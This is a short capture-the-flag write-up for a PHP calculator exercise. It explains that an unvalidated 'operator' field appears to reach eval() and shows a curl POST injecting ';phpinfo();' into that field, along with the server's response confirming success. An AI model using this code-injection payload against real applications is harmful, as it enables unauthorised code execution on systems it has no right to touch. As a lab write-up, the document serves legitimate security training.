# A1 Injection

1.	The goal is to inject the `phpinfo()` function in order to show its output.
	After some attemps, seems that `operand1` and `operand2` input fields must
	be numbers. On the contrary, `operator` field is not validated. Therefore,
	it's realistic to assume that `operator` is the attack's veicle.

2.	In the normal behaviour, the app replies with

		The result of X + Y is: Z

	where X is the value of `operand1`, Y the value of `operand2` and Z the
	result of the operation (maybe generated through `eval()` function).

3.	Our task is to include the "magic code" in the operator field. Let's try
	this

		$ curl -XPOST --data "operand1=1&operand2=1&operator=;phpinfo();" \
			http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php
		HTTP/1.1 200 OK
		Date: Mon, 07 Sep 2015 08:08:54 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.6
		Set-Cookie: PHPSESSID=gqinri2rihvkjb7jvu4ea9ase7; path=/
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
		Pragma: no-cache
		Vary: Accept-Encoding
		Content-Length: 7561
		Content-Type: text/html

		[...]

		<div class="modal-body">
			<p>You managed to complete level 2. You will be redirected to level 3 in 10 seconds.</p>
		</div>

		[...]

	It seems to work...

[Go to Ex1](./ex1.md) | [Go to Ex3] (./ex3.md)
